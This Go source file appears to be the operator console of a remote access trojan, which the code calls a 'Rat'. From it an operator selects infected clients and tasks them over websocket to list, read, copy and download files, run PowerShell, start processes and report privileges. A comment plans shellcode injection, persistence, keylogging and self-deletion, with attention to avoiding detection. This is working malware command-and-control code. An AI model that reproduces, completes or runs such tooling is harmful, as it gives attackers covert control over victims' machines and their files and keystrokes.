package main

import (
	"fmt"
	"github.com/peterh/liner"
	"os"
	"os/exec"
	"strings"
	"log"
	"math/rand"
	"time"
	"github.com/gorilla/websocket"
	
)


// map lookup to match commands to command codes
/*
	commands to add
		- upload file
		- getpid (get Processes PID)
		- screenshot
		- runas(requires user/pass)
		- execute (run commands using powershell/cmd) (remeber to warn them about detection)
		- netinfo(gets network information)
		- inject (allow the user to inject shellcode into a process)
		- reconfigure (reconfigure the rats settings, jitter, sleep, domain etc)
		- shell (drop into the interactive shell) (remeber to warn about detection)
		- destruct (force rat to delete persistence and delete its self)(force user to say yes or no)
		- impersonate 
		- kill (kill a process)
		- spawn (start a process)
		- ps (list processes)
		- persist (set up persistence, let user choose different options(reg key, startup, wmi, sched task etc))
		- keylog (start keylogging)
		- dump-keys (dump the logged keys)
		- and more

*/

type clients struct {
		code_name string
		username  string
		hostname  string
		ip        string
		pid       string
		version   string
		last_checkin string;
}



var (
	m = map[string]int32 {
		"getprivs":1,
		"ls":2,
		"cd":3,
		"cat":4,
		"mv":5,
		"cp":6,
		"temp":7,
		"download":8,
		"ps":9,
		"reconfig":10,
		"start":11,
	}
	
	grey = "\033[90m"
	reset = "\033[0m"
	red = "\033[31m"
	bold = "\033[1m"
	

) 
const charset = "abcdefghijklmnopqrstuvwxyz0123456789"
var client_in_use string
var is_interactive bool = false

func PrintHelp() {
	fmt.Println("=========================================================================")
	fmt.Println("|---use <id>        | use a client")
	fmt.Println("|---list            | List all clients")
	fmt.Println("|---back            | stop using client")
	fmt.Println("|---getprivs        | Prints The Users Privileges")
	fmt.Println("|---ps              | Run a powershell Command")
	fmt.Println("|---start           | Start a Process on the client")
	fmt.Println("|---Help            | Prints This Help message")
	fmt.Println("|---ls <dir>        | List Contents Of Directory(Defaults to Current dir)")
	fmt.Println("|---cd <dir>        | change Directory")
	fmt.Println("|---mv <src> <dst>  | move a file")
	fmt.Println("|---cp <src> <dst>  | copy a file")
	fmt.Println("|---interactive     | Change to Realtime communication")
	fmt.Println("|---session         | revert backt to beacon")
	fmt.Println("=========================================================================")

}


func UsingClient() bool {
	if client_in_use == "" {
		msg := fmt.Sprintf("%s%s[%s%s!%s%s%s]%s Must Be Using Client", red, bold, reset, bold, reset, red, bold, reset)
		fmt.Println(msg);
		return false;
	}

	return true
}


// generate random command ID for the agent
func generateRandomID(length int) string {
	rand.Seed(time.Now().UnixNano()) // seed once
	result := make([]byte, length)
	for i := range result {
		result[i] = charset[rand.Intn(len(charset))]
	}
	return string(result)
}





// Handles Merging Multi Word paths into a single Path, removes qoutes and then trims any spaces
// input = "download my passwords.txt"
// output = my passwords.txt
func trimAndAddWords(parts []string) []string {
    var cleaned []string
    for _, p := range parts[1:] {
        p = strings.Trim(p, `"'`)
        p = strings.TrimSpace(p)
        if p != "" {
            cleaned = append(cleaned, p)
        }
    }
    return cleaned
}

func (c *Client) sendAndPrint(action string, code int32, param string, param2 string, is_interactive bool) {
	err := c.sendCommand("addCmd", client_in_use, code, param, param2, generateRandomID(8), "now", is_interactive)
	if is_interactive == true {
		return
	}
	if err != nil {
		fmt.Println("Error:", err)
		return
	}
}



func (c *Client) parseCommand(input string) {
	
	parts := strings.Fields(input);

	cmd := parts[0];

	switch cmd {

	case "tasks":
		if UsingClient() {
			fmt.Println("[+] Tasks For Client");
			ListTasks(client_in_use);
			return;
		}
		

	case "download":
		if UsingClient() {
			if len(parts) >= 2 {
				agrs := trimAndAddWords(parts)
				filename := agrs[0]
				c.sendAndPrint("addCmd", m["download"], filename, "", is_interactive)
				return;
			} else {
				fmt.Println("[!] Need filename");
				return;
			}
		}
	case "cp":
		if UsingClient() {
			if len(parts) >=3 {
				args := trimAndAddWords(parts)
				src := args[0]
				dest := args[1]
				c.sendAndPrint("addCmd", m["cp"], src, dest, is_interactive)
				return
			} else {
				fmt.Println("[!] Incorrect syntax run 'help' for list of commands")
			}
		}


	case "interactive":
		fmt.Println("[+] Tasked Rat To Turn Interactive")
		check := c.TurnRatInteracive(client_in_use)
		if check {
			fmt.Println("[+] Command Inserted")
			is_interactive = true
			return
		} else {
			fmt.Println("[!] Server Failed to insert command")
			return
		}
		

	case "session":
		fmt.Println("[+] Rat back in beacon mode")
		TurnRatSession(client_in_use)
		is_interactive = false

	case "cd":
		if UsingClient()  {
			if len(parts) >= 2 {
				args := trimAndAddWords(parts)
				directory := strings.Join(args, " ") 
				fmt.Println(directory)
				fmt.Printf("[+] Tasked Rat To change Directory too %s\n", directory);
				c.sendAndPrint("addCmd", m["cd"], directory, "", is_interactive);

			} else {
				fmt.Println("[!] Requires Directory");
				return;
			}
		}
		

	case "cat":
		if UsingClient() {
			if len(parts) >= 2 {
				args := trimAndAddWords(parts)
				file := args[0]
				fmt.Printf("[+] Tasked Rat To Cat %s\n", file);
				c.sendAndPrint("addCmd", m["cat"], file, "", is_interactive)
				return
				
			} else {
				fmt.Println("[!] Requires file");
				return;
			}
		}
		


	case "ls":
		var directory string
		if UsingClient() { 
			if len(parts) < 2 {
				directory = "."
			} else {
				// directory = trimAndAddWords(parts);
				args := trimAndAddWords(parts)
				directory = args[0]
			}
			fmt.Printf("[+] Tasked Rat to List %s\n", directory);
			c.sendAndPrint("addCmd", m["ls"], directory, "", is_interactive)
			return;
		}

	case "list":
		c.ListClients()
		return;

	case "use":
		if len(parts) >= 2 {
			args := trimAndAddWords(parts)
			name := args[0]


			var temp string
			temp, err := c.code_name_to_guid(name); 
			if err != nil {
				return;
			}
			client_in_use = temp
			connectToWebSocket(client_in_use)
			return;
		} else {
			fmt.Println("[!] Must Choose Client!");
			return;
		}

	case "getprivs":
		if UsingClient() {
			c.sendAndPrint("addCmd", m["getprivs"], "NULL", "", is_interactive)
			return
		}

	case "reconfig": 
		// times := trimAndAddWords(parts);
		args := trimAndAddWords(parts)
		times := args[0]
		fmt.Println(times)
		c.sendAndPrint("addCmd", m["reconfig"], times, "",  is_interactive)


	
	case "back":
		conn, exists := ActiveConnections[client_in_use];
		if !exists {
			fmt.Println("[!] Not using a client");
			return
		}
		_ = conn.WriteMessage(websocket.CloseMessage, websocket.FormatCloseMessage(websocket.CloseNormalClosure, "bye"))

		conn.Close()
		delete(ActiveConnections, client_in_use)
		client_in_use = ""

	case "ps":
		if UsingClient()  {
			args := trimAndAddWords(parts)
			arguments := strings.Join(args, " ")
			c.sendAndPrint("addCmd", m["ps"], arguments, "", is_interactive)
			return;
		}
	case "start":
		if UsingClient() {
			args := trimAndAddWords(parts)
			arguments := args[0]
			c.sendAndPrint("addCmd", m["start"], arguments, "", is_interactive)
		}
		

	case "help":
		PrintHelp()

	default:
		fmt.Println("[!] Invalid Command");
		return;
	}

}



func main() {
	
	client, _ := connectToServer();
	if client == nil {
		os.Exit(1);
	}
	
	line := liner.NewLiner()
	defer line.Close()
	
	for  {
		prompt := fmt.Sprintf("%s[%s %s]%s ", grey, time.Now().Format("01/02"), time.Now().Format("15:04:05"), reset)
		fmt.Printf("%s", prompt)
		input, err := line.Prompt("$> ");
		if err != nil {
			log.Fatal(err);
		}

		line.AppendHistory(input);


		input = strings.TrimSpace(input);

		if input == "exit" {
			os.Exit(0);
		} else if input == "cls" {
			cmd := exec.Command("clear");
			cmd.Stdout = os.Stdout;
			cmd.Run()
			continue;
		}

		if input != "" {
			client.parseCommand(input);
		}
		
		
	}
	

}

